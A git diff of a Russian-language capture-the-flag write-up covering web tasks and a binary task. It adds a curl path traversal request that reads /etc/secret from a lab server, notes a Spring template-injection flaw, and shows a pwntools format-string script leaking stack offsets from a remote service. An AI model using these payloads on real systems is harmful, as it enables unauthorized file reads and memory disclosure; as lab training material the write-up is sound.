@@ -1,9 +1,13 @@
 # Task-Based
 ## Web
 ### Web1
-Заходим на сайт видим подсвеченный номер-ссылку одной из ячеек календаря.
-Переходим видим hint_1 понимаем, что это уязвимость Path Traversal.
-Добавляем после равно в url хинта ../../etc/secret выгружаем файл на наш компьютер, получаем флаг.
+Замечаем, что на сайте присутствует уязвимость Path Traversal.
+Так как в file1.txt есть подсказка об /etc/secret, с помощью уязвимости открываем данный файл.
+Exploit:
+```
+curl http://192.168.12.10:5001/download?file_type=../../../../../../etc/secret
+```
+
 ### Web2
 Находим ssti в /doc/ и пример эксплуатации: https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability.
 Изначально в директории /login перед чтением пароля из файла password.txt переменной adminPassword присваивается значение по умолчанию: password.
@@ -40,7 +44,7 @@ offset = 6
 
 def leak_offset():
     for i in range(1,20):
-        p = process("/home/kali/Downloads/main")
+        p = connect("192.168.12.13",1923)
         p.sendline(b"A" * 8 + f"%{i}$llx".encode().ljust(8,b"|") + b"A" * 8)
         print(i,p.recvline())
         p.close()
